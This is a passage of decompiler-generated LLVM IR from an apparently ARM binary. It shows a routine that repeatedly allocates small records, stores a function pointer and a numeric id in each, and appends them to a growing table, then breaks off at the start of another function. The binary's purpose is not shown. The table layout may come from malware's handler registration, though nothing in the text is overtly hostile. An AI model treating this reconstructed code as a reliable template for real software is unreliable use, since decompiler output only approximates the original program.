  %v1_b354 = load i32, i32* %r6.global-to-local, align 4
  %v2_b354 = inttoptr i32 %v1_b354 to i32*
  store i32 %v0_b354, i32* %v2_b354, align 4
  %v0_b358 = load i32, i32* %r2.global-to-local, align 4
  %v1_b358 = trunc i32 %v0_b358 to i8
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = inttoptr i32 %v2_b358 to i8*
  store i8 %v1_b358, i8* %v3_b358, align 1
  %v2_b35c = call i32 @_calloc(i32 %v1_b348, i32 8)
  %v2_b360 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b360 = zext i8 %v2_b360 to i32
  store i32 ptrtoint (i32* @global_var_f5f0.124 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b35c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_b370 = mul nuw nsw i32 %v3_b360, 4
  store i32 %v3_b370, i32* %r1.global-to-local, align 4
  %v2_b374 = load i32, i32* @global_var_1d938.111, align 4
  %v2_b378 = inttoptr i32 %v2_b35c to i32*
  store i32 ptrtoint (i32* @global_var_f5f0.124 to i32), i32* %v2_b378, align 4
  %v3_b37c = load i32, i32* %r5.global-to-local, align 4
  %v4_b37c = add i32 %v3_b37c, 4
  %v5_b37c = inttoptr i32 %v4_b37c to i8*
  store i8 2, i8* %v5_b37c, align 1
  %v0_b380 = load i32, i32* %r1.global-to-local, align 4
  %v1_b380 = add i32 %v0_b380, 4
  store i32 %v1_b380, i32* %r1.global-to-local, align 4
  %v5_b384 = call i32 @_realloc(i32 %v2_b374, i32 %v1_b380, i32 ptrtoint (i32* @global_var_f5f0.124 to i32), i32 2)
  %v2_b388 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b388 = zext i8 %v2_b388 to i32
  store i32 %v3_b388, i32* %r3.global-to-local, align 4
  store i32 %v5_b384, i32* %ip.global-to-local, align 4
  %v0_b390 = load i32, i32* %r5.global-to-local, align 4
  %v5_b390 = mul nuw nsw i32 %v3_b388, 4
  %v6_b390 = add i32 %v5_b390, %v5_b384
  %v7_b390 = inttoptr i32 %v6_b390 to i32*
  store i32 %v0_b390, i32* %v7_b390, align 4
  %v0_b394 = load i32, i32* %r3.global-to-local, align 4
  %v1_b394 = load i32, i32* %r7.global-to-local, align 4
  %v2_b394 = add i32 %v1_b394, %v0_b394
  store i32 %v2_b394, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b3a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b3a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b3a0 = inttoptr i32 %v1_b3a0 to i32*
  store i32 %v0_b3a0, i32* %v2_b3a0, align 4
  %v0_b3a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3a4 = trunc i32 %v0_b3a4 to i8
  %v2_b3a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3a4 = inttoptr i32 %v2_b3a4 to i8*
  store i8 %v1_b3a4, i8* %v3_b3a4, align 1
  %v2_b3a8 = call i32 @_calloc(i32 %v1_b394, i32 8)
  %v2_b3ac = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b3ac = zext i8 %v2_b3ac to i32
  store i32 ptrtoint (i32* @global_var_e4d0.126 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b3a8, i32* %r5.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v3_b3bc = mul nuw nsw i32 %v3_b3ac, 4
  store i32 %v3_b3bc, i32* %r1.global-to-local, align 4
  %v2_b3c0 = load i32, i32* @global_var_1d938.111, align 4
  %v2_b3c4 = inttoptr i32 %v2_b3a8 to i32*
  store i32 ptrtoint (i32* @global_var_e4d0.126 to i32), i32* %v2_b3c4, align 4
  %v3_b3c8 = load i32, i32* %r5.global-to-local, align 4
  %v4_b3c8 = add i32 %v3_b3c8, 4
  %v5_b3c8 = inttoptr i32 %v4_b3c8 to i8*
  store i8 9, i8* %v5_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = add i32 %v0_b3cc, 4
  store i32 %v1_b3cc, i32* %r1.global-to-local, align 4
  %v5_b3d0 = call i32 @_realloc(i32 %v2_b3c0, i32 %v1_b3cc, i32 ptrtoint (i32* @global_var_e4d0.126 to i32), i32 9)
  %v2_b3d4 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b3d4 = zext i8 %v2_b3d4 to i32
  store i32 %v3_b3d4, i32* %r3.global-to-local, align 4
  store i32 %v5_b3d0, i32* %ip.global-to-local, align 4
  %v0_b3dc = load i32, i32* %r5.global-to-local, align 4
  %v5_b3dc = mul nuw nsw i32 %v3_b3d4, 4
  %v6_b3dc = add i32 %v5_b3dc, %v5_b3d0
  %v7_b3dc = inttoptr i32 %v6_b3dc to i32*
  store i32 %v0_b3dc, i32* %v7_b3dc, align 4
  %v0_b3e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3e0 = load i32, i32* %r7.global-to-local, align 4
  %v2_b3e0 = add i32 %v1_b3e0, %v0_b3e0
  store i32 %v2_b3e0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b3ec = load i32, i32* %ip.global-to-local, align 4
  %v1_b3ec = load i32, i32* %r6.global-to-local, align 4
  %v2_b3ec = inttoptr i32 %v1_b3ec to i32*
  store i32 %v0_b3ec, i32* %v2_b3ec, align 4
  %v0_b3f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3f0 = trunc i32 %v0_b3f0 to i8
  %v2_b3f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3f0 = inttoptr i32 %v2_b3f0 to i8*
  store i8 %v1_b3f0, i8* %v3_b3f0, align 1
  %v2_b3f4 = call i32 @_calloc(i32 %v1_b3e0, i32 8)
  %v2_b3f8 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b3f8 = zext i8 %v2_b3f8 to i32
  store i32 59320, i32* %r2.global-to-local, align 4
  store i32 %v2_b3f4, i32* %r5.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v3_b408 = mul nuw nsw i32 %v3_b3f8, 4
  store i32 %v3_b408, i32* %r1.global-to-local, align 4
  %v2_b40c = load i32, i32* @global_var_1d938.111, align 4
  %v2_b410 = inttoptr i32 %v2_b3f4 to i32*
  store i32 59320, i32* %v2_b410, align 4
  %v3_b414 = load i32, i32* %r5.global-to-local, align 4
  %v4_b414 = add i32 %v3_b414, 4
  %v5_b414 = inttoptr i32 %v4_b414 to i8*
  store i8 12, i8* %v5_b414, align 1
  %v0_b418 = load i32, i32* %r1.global-to-local, align 4
  %v1_b418 = add i32 %v0_b418, 4
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v5_b41c = call i32 @_realloc(i32 %v2_b40c, i32 %v1_b418, i32 59320, i32 12)
  %v2_b420 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b420 = zext i8 %v2_b420 to i32
  store i32 %v3_b420, i32* %r3.global-to-local, align 4
  store i32 %v5_b41c, i32* %ip.global-to-local, align 4
  %v0_b428 = load i32, i32* %r5.global-to-local, align 4
  %v5_b428 = mul nuw nsw i32 %v3_b420, 4
  %v6_b428 = add i32 %v5_b428, %v5_b41c
  %v7_b428 = inttoptr i32 %v6_b428 to i32*
  store i32 %v0_b428, i32* %v7_b428, align 4
  %v0_b42c = load i32, i32* %r3.global-to-local, align 4
  %v1_b42c = load i32, i32* %r7.global-to-local, align 4
  %v2_b42c = add i32 %v1_b42c, %v0_b42c
  store i32 %v2_b42c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b438 = load i32, i32* %ip.global-to-local, align 4
  %v1_b438 = load i32, i32* %r6.global-to-local, align 4
  %v2_b438 = inttoptr i32 %v1_b438 to i32*
  store i32 %v0_b438, i32* %v2_b438, align 4
  %v0_b43c = load i32, i32* %r2.global-to-local, align 4
  %v1_b43c = trunc i32 %v0_b43c to i8
  %v2_b43c = load i32, i32* %r4.global-to-local, align 4
  %v3_b43c = inttoptr i32 %v2_b43c to i8*
  store i8 %v1_b43c, i8* %v3_b43c, align 1
  %v2_b440 = call i32 @_calloc(i32 %v1_b42c, i32 8)
  %v2_b444 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b444 = zext i8 %v2_b444 to i32
  store i32 ptrtoint (i32* @global_var_dd8c.129 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b440, i32* %r5.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_b454 = mul nuw nsw i32 %v3_b444, 4
  store i32 %v3_b454, i32* %r1.global-to-local, align 4
  %v2_b458 = load i32, i32* @global_var_1d938.111, align 4
  %v2_b45c = inttoptr i32 %v2_b440 to i32*
  store i32 ptrtoint (i32* @global_var_dd8c.129 to i32), i32* %v2_b45c, align 4
  %v3_b460 = load i32, i32* %r5.global-to-local, align 4
  %v4_b460 = add i32 %v3_b460, 4
  %v5_b460 = inttoptr i32 %v4_b460 to i8*
  store i8 3, i8* %v5_b460, align 1
  %v0_b464 = load i32, i32* %r1.global-to-local, align 4
  %v1_b464 = add i32 %v0_b464, 4
  store i32 %v1_b464, i32* %r1.global-to-local, align 4
  %v5_b468 = call i32 @_realloc(i32 %v2_b458, i32 %v1_b464, i32 ptrtoint (i32* @global_var_dd8c.129 to i32), i32 3)
  %v2_b46c = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b46c = zext i8 %v2_b46c to i32
  store i32 %v3_b46c, i32* %r3.global-to-local, align 4
  store i32 %v5_b468, i32* %ip.global-to-local, align 4
  %v0_b474 = load i32, i32* %r5.global-to-local, align 4
  %v5_b474 = mul nuw nsw i32 %v3_b46c, 4
  %v6_b474 = add i32 %v5_b474, %v5_b468
  %v7_b474 = inttoptr i32 %v6_b474 to i32*
  store i32 %v0_b474, i32* %v7_b474, align 4
  %v0_b478 = load i32, i32* %r3.global-to-local, align 4
  %v1_b478 = load i32, i32* %r7.global-to-local, align 4
  %v2_b478 = add i32 %v1_b478, %v0_b478
  store i32 %v2_b478, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b484 = load i32, i32* %ip.global-to-local, align 4
  %v1_b484 = load i32, i32* %r6.global-to-local, align 4
  %v2_b484 = inttoptr i32 %v1_b484 to i32*
  store i32 %v0_b484, i32* %v2_b484, align 4
  %v0_b488 = load i32, i32* %r2.global-to-local, align 4
  %v1_b488 = trunc i32 %v0_b488 to i8
  %v2_b488 = load i32, i32* %r4.global-to-local, align 4
  %v3_b488 = inttoptr i32 %v2_b488 to i8*
  store i8 %v1_b488, i8* %v3_b488, align 1
  %v2_b48c = call i32 @_calloc(i32 %v1_b478, i32 8)
  %v2_b490 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b490 = zext i8 %v2_b490 to i32
  store i32 ptrtoint (i32* @global_var_d618.131 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b48c, i32* %r5.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_b4a0 = mul nuw nsw i32 %v3_b490, 4
  store i32 %v3_b4a0, i32* %r1.global-to-local, align 4
  %v2_b4a4 = load i32, i32* @global_var_1d938.111, align 4
  %v2_b4a8 = inttoptr i32 %v2_b48c to i32*
  store i32 ptrtoint (i32* @global_var_d618.131 to i32), i32* %v2_b4a8, align 4
  %v3_b4ac = load i32, i32* %r5.global-to-local, align 4
  %v4_b4ac = add i32 %v3_b4ac, 4
  %v5_b4ac = inttoptr i32 %v4_b4ac to i8*
  store i8 4, i8* %v5_b4ac, align 1
  %v0_b4b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b4b0 = add i32 %v0_b4b0, 4
  store i32 %v1_b4b0, i32* %r1.global-to-local, align 4
  %v5_b4b4 = call i32 @_realloc(i32 %v2_b4a4, i32 %v1_b4b0, i32 ptrtoint (i32* @global_var_d618.131 to i32), i32 4)
  %v2_b4b8 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b4b8 = zext i8 %v2_b4b8 to i32
  store i32 %v3_b4b8, i32* %r3.global-to-local, align 4
  store i32 %v5_b4b4, i32* %ip.global-to-local, align 4
  %v0_b4c0 = load i32, i32* %r5.global-to-local, align 4
  %v5_b4c0 = mul nuw nsw i32 %v3_b4b8, 4
  %v6_b4c0 = add i32 %v5_b4c0, %v5_b4b4
  %v7_b4c0 = inttoptr i32 %v6_b4c0 to i32*
  store i32 %v0_b4c0, i32* %v7_b4c0, align 4
  %v0_b4c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b4c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_b4c4 = add i32 %v1_b4c4, %v0_b4c4
  store i32 %v2_b4c4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b4d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b4d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b4d0 = inttoptr i32 %v1_b4d0 to i32*
  store i32 %v0_b4d0, i32* %v2_b4d0, align 4
  %v0_b4d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b4d4 = trunc i32 %v0_b4d4 to i8
  %v2_b4d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b4d4 = inttoptr i32 %v2_b4d4 to i8*
  store i8 %v1_b4d4, i8* %v3_b4d4, align 1
  %v2_b4d8 = call i32 @_calloc(i32 %v1_b4c4, i32 8)
  %v2_b4dc = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b4dc = zext i8 %v2_b4dc to i32
  store i32 ptrtoint (i32* @global_var_c520.133 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b4d8, i32* %r5.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_b4ec = mul nuw nsw i32 %v3_b4dc, 4
  store i32 %v3_b4ec, i32* %r1.global-to-local, align 4
  %v2_b4f0 = load i32, i32* @global_var_1d938.111, align 4
  %v2_b4f4 = inttoptr i32 %v2_b4d8 to i32*
  store i32 ptrtoint (i32* @global_var_c520.133 to i32), i32* %v2_b4f4, align 4
  %v3_b4f8 = load i32, i32* %r5.global-to-local, align 4
  %v4_b4f8 = add i32 %v3_b4f8, 4
  %v5_b4f8 = inttoptr i32 %v4_b4f8 to i8*
  store i8 5, i8* %v5_b4f8, align 1
  %v0_b4fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b4fc = add i32 %v0_b4fc, 4
  store i32 %v1_b4fc, i32* %r1.global-to-local, align 4
  %v5_b500 = call i32 @_realloc(i32 %v2_b4f0, i32 %v1_b4fc, i32 ptrtoint (i32* @global_var_c520.133 to i32), i32 5)
  %v2_b504 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b504 = zext i8 %v2_b504 to i32
  store i32 %v3_b504, i32* %r3.global-to-local, align 4
  store i32 %v5_b500, i32* %ip.global-to-local, align 4
  %v0_b50c = load i32, i32* %r5.global-to-local, align 4
  %v5_b50c = mul nuw nsw i32 %v3_b504, 4
  %v6_b50c = add i32 %v5_b50c, %v5_b500
  %v7_b50c = inttoptr i32 %v6_b50c to i32*
  store i32 %v0_b50c, i32* %v7_b50c, align 4
  %v0_b510 = load i32, i32* %r3.global-to-local, align 4
  %v1_b510 = load i32, i32* %r7.global-to-local, align 4
  %v2_b510 = add i32 %v1_b510, %v0_b510
  store i32 %v2_b510, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b51c = load i32, i32* %ip.global-to-local, align 4
  %v1_b51c = load i32, i32* %r6.global-to-local, align 4
  %v2_b51c = inttoptr i32 %v1_b51c to i32*
  store i32 %v0_b51c, i32* %v2_b51c, align 4
  %v0_b520 = load i32, i32* %r2.global-to-local, align 4
  %v1_b520 = trunc i32 %v0_b520 to i8
  %v2_b520 = load i32, i32* %r4.global-to-local, align 4
  %v3_b520 = inttoptr i32 %v2_b520 to i8*
  store i8 %v1_b520, i8* %v3_b520, align 1
  %v2_b524 = call i32 @_calloc(i32 %v1_b510, i32 8)
  %v2_b528 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b528 = zext i8 %v2_b528 to i32
  store i32 ptrtoint (i32* @global_var_cd9c.135 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b524, i32* %r5.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v3_b538 = mul nuw nsw i32 %v3_b528, 4
  store i32 %v3_b538, i32* %r1.global-to-local, align 4
  %v2_b53c = load i32, i32* @global_var_1d938.111, align 4
  %v2_b540 = inttoptr i32 %v2_b524 to i32*
  store i32 ptrtoint (i32* @global_var_cd9c.135 to i32), i32* %v2_b540, align 4
  %v3_b544 = load i32, i32* %r5.global-to-local, align 4
  %v4_b544 = add i32 %v3_b544, 4
  %v5_b544 = inttoptr i32 %v4_b544 to i8*
  store i8 11, i8* %v5_b544, align 1
  %v0_b548 = load i32, i32* %r1.global-to-local, align 4
  %v1_b548 = add i32 %v0_b548, 4
  store i32 %v1_b548, i32* %r1.global-to-local, align 4
  %v5_b54c = call i32 @_realloc(i32 %v2_b53c, i32 %v1_b548, i32 ptrtoint (i32* @global_var_cd9c.135 to i32), i32 11)
  %v2_b550 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b550 = zext i8 %v2_b550 to i32
  store i32 %v3_b550, i32* %r3.global-to-local, align 4
  store i32 %v5_b54c, i32* %ip.global-to-local, align 4
  %v0_b558 = load i32, i32* %r5.global-to-local, align 4
  %v5_b558 = mul nuw nsw i32 %v3_b550, 4
  %v6_b558 = add i32 %v5_b558, %v5_b54c
  %v7_b558 = inttoptr i32 %v6_b558 to i32*
  store i32 %v0_b558, i32* %v7_b558, align 4
  %v0_b55c = load i32, i32* %r3.global-to-local, align 4
  %v1_b55c = load i32, i32* %r7.global-to-local, align 4
  %v2_b55c = add i32 %v1_b55c, %v0_b55c
  store i32 %v2_b55c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b568 = load i32, i32* %ip.global-to-local, align 4
  %v1_b568 = load i32, i32* %r6.global-to-local, align 4
  %v2_b568 = inttoptr i32 %v1_b568 to i32*
  store i32 %v0_b568, i32* %v2_b568, align 4
  %v0_b56c = load i32, i32* %r2.global-to-local, align 4
  %v1_b56c = trunc i32 %v0_b56c to i8
  %v2_b56c = load i32, i32* %r4.global-to-local, align 4
  %v3_b56c = inttoptr i32 %v2_b56c to i8*
  store i8 %v1_b56c, i8* %v3_b56c, align 1
  %v2_b570 = call i32 @_calloc(i32 %v1_b55c, i32 8)
  %v2_b574 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b574 = zext i8 %v2_b574 to i32
  store i32 ptrtoint (i32* @global_var_be04.137 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b570, i32* %r5.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_b584 = mul nuw nsw i32 %v3_b574, 4
  store i32 %v3_b584, i32* %r1.global-to-local, align 4
  %v2_b588 = load i32, i32* @global_var_1d938.111, align 4
  %v2_b58c = inttoptr i32 %v2_b570 to i32*
  store i32 ptrtoint (i32* @global_var_be04.137 to i32), i32* %v2_b58c, align 4
  %v3_b590 = load i32, i32* %r5.global-to-local, align 4
  %v4_b590 = add i32 %v3_b590, 4
  %v5_b590 = inttoptr i32 %v4_b590 to i8*
  store i8 6, i8* %v5_b590, align 1
  %v0_b594 = load i32, i32* %r1.global-to-local, align 4
  %v1_b594 = add i32 %v0_b594, 4
  store i32 %v1_b594, i32* %r1.global-to-local, align 4
  %v5_b598 = call i32 @_realloc(i32 %v2_b588, i32 %v1_b594, i32 ptrtoint (i32* @global_var_be04.137 to i32), i32 6)
  %v2_b59c = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b59c = zext i8 %v2_b59c to i32
  store i32 %v3_b59c, i32* %r3.global-to-local, align 4
  store i32 %v5_b598, i32* %ip.global-to-local, align 4
  %v0_b5a4 = load i32, i32* %r5.global-to-local, align 4
  %v5_b5a4 = mul nuw nsw i32 %v3_b59c, 4
  %v6_b5a4 = add i32 %v5_b5a4, %v5_b598
  %v7_b5a4 = inttoptr i32 %v6_b5a4 to i32*
  store i32 %v0_b5a4, i32* %v7_b5a4, align 4
  %v0_b5a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b5a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_b5a8 = add i32 %v1_b5a8, %v0_b5a8
  store i32 %v2_b5a8, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b5b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_b5b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_b5b4 = inttoptr i32 %v1_b5b4 to i32*
  store i32 %v0_b5b4, i32* %v2_b5b4, align 4
  %v0_b5b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b5b8 = trunc i32 %v0_b5b8 to i8
  %v2_b5b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b5b8 = inttoptr i32 %v2_b5b8 to i8*
  store i8 %v1_b5b8, i8* %v3_b5b8, align 1
  %v2_b5bc = call i32 @_calloc(i32 %v1_b5a8, i32 8)
  %v2_b5c0 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b5c0 = zext i8 %v2_b5c0 to i32
  store i32 ptrtoint (i32* @global_var_b688.139 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b5bc, i32* %r5.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_b5d0 = mul nuw nsw i32 %v3_b5c0, 4
  store i32 %v3_b5d0, i32* %r1.global-to-local, align 4
  %v2_b5d4 = load i32, i32* @global_var_1d938.111, align 4
  %v2_b5d8 = inttoptr i32 %v2_b5bc to i32*
  store i32 ptrtoint (i32* @global_var_b688.139 to i32), i32* %v2_b5d8, align 4
  %v3_b5dc = load i32, i32* %r5.global-to-local, align 4
  %v4_b5dc = add i32 %v3_b5dc, 4
  %v5_b5dc = inttoptr i32 %v4_b5dc to i8*
  store i8 7, i8* %v5_b5dc, align 1
  %v0_b5e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b5e0 = add i32 %v0_b5e0, 4
  store i32 %v1_b5e0, i32* %r1.global-to-local, align 4
  %v5_b5e4 = call i32 @_realloc(i32 %v2_b5d4, i32 %v1_b5e0, i32 ptrtoint (i32* @global_var_b688.139 to i32), i32 7)
  %v2_b5e8 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b5e8 = zext i8 %v2_b5e8 to i32
  store i32 %v3_b5e8, i32* %r3.global-to-local, align 4
  store i32 %v5_b5e4, i32* %ip.global-to-local, align 4
  %v0_b5f0 = load i32, i32* %r5.global-to-local, align 4
  %v5_b5f0 = mul nuw nsw i32 %v3_b5e8, 4
  %v6_b5f0 = add i32 %v5_b5f0, %v5_b5e4
  %v7_b5f0 = inttoptr i32 %v6_b5f0 to i32*
  store i32 %v0_b5f0, i32* %v7_b5f0, align 4
  %v0_b5f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b5f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_b5f4 = add i32 %v1_b5f4, %v0_b5f4
  store i32 %v2_b5f4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v1_b600 = trunc i32 %v2_b5f4 to i8
  %v2_b600 = load i32, i32* %r4.global-to-local, align 4
  %v3_b600 = inttoptr i32 %v2_b600 to i8*
  store i8 %v1_b600, i8* %v3_b600, align 1
  %v0_b604 = load i32, i32* %ip.global-to-local, align 4
  %v1_b604 = load i32, i32* %r6.global-to-local, align 4
  %v2_b604 = inttoptr i32 %v1_b604 to i32*
  store i32 %v0_b604, i32* %v2_b604, align 4
  %v2_b608 = call i32 @_calloc(i32 %v1_b5f4, i32 8)
  %v2_b60c = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b60c = zext i8 %v2_b60c to i32
  store i32 ptrtoint (i32* @global_var_8f24.141 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_b608, i32* %r5.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v3_b61c = mul nuw nsw i32 %v3_b60c, 4
  store i32 %v3_b61c, i32* %r1.global-to-local, align 4
  %v2_b620 = load i32, i32* @global_var_1d938.111, align 4
  %v2_b624 = inttoptr i32 %v2_b608 to i32*
  store i32 ptrtoint (i32* @global_var_8f24.141 to i32), i32* %v2_b624, align 4
  %v3_b628 = load i32, i32* %r5.global-to-local, align 4
  %v4_b628 = add i32 %v3_b628, 4
  %v5_b628 = inttoptr i32 %v4_b628 to i8*
  store i8 10, i8* %v5_b628, align 1
  %v0_b62c = load i32, i32* %r1.global-to-local, align 4
  %v1_b62c = add i32 %v0_b62c, 4
  store i32 %v1_b62c, i32* %r1.global-to-local, align 4
  %v5_b630 = call i32 @_realloc(i32 %v2_b620, i32 %v1_b62c, i32 ptrtoint (i32* @global_var_8f24.141 to i32), i32 10)
  %v2_b634 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b634 = zext i8 %v2_b634 to i32
  store i32 %v3_b634, i32* %r3.global-to-local, align 4
  %v1_b638 = load i32, i32* %r6.global-to-local, align 4
  %v2_b638 = inttoptr i32 %v1_b638 to i32*
  store i32 %v5_b630, i32* %v2_b638, align 4
  %v0_b63c = load i32, i32* %r5.global-to-local, align 4
  %v2_b63c = load i32, i32* %r3.global-to-local, align 4
  %v5_b63c = mul i32 %v2_b63c, 4
  %v6_b63c = add i32 %v5_b63c, %v5_b630
  %v7_b63c = inttoptr i32 %v6_b63c to i32*
  store i32 %v0_b63c, i32* %v7_b63c, align 4
  %v0_b640 = load i32, i32* %r3.global-to-local, align 4
  %v1_b640 = load i32, i32* %r7.global-to-local, align 4
  %v2_b640 = add i32 %v1_b640, %v0_b640
  store i32 %v2_b640, i32* %r2.global-to-local, align 4
  %v1_b648 = trunc i32 %v2_b640 to i8
  %v2_b648 = load i32, i32* %r4.global-to-local, align 4
  %v3_b648 = inttoptr i32 %v2_b648 to i8*
  store i8 %v1_b648, i8* %v3_b648, align 1
  %v2_b64c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_b64c, i32* @r4, align 4
  ret i32 %v1_b640

; uselistorder directives
  uselistorder i32 %v1_b640, { 1, 0 }
  uselistorder i32 %v1_b5f4, { 1, 0 }
  uselistorder i32 %v1_b5a8, { 1, 0 }
  uselistorder i32 %v1_b55c, { 1, 0 }
  uselistorder i32 %v1_b510, { 1, 0 }
  uselistorder i32 %v1_b4c4, { 1, 0 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b42c, { 1, 0 }
  uselistorder i32 %v1_b3e0, { 1, 0 }
  uselistorder i32 %v1_b394, { 1, 0 }
  uselistorder i32 %v1_b348, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i8 7, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32* @global_var_1d938.111, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i8* bitcast (i8** @global_var_1d934.109 to i8*), { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_b688(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b688:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_b688 = load i32, i32* @r4, align 4
  %v6_b688 = load i32, i32* @r5, align 4
  %v9_b688 = load i32, i32* @r6, align 4
  %v12_b688 = load i32, i32* @r7, align 4
  %v15_b688 = load i32, i32* @r8, align 4
  %v21_b688 = load i32, i32* @sl, align 4
  %v1_b68c = urem i32 %arg1, 256
  store i32 %v1_b68c, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_b68c, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
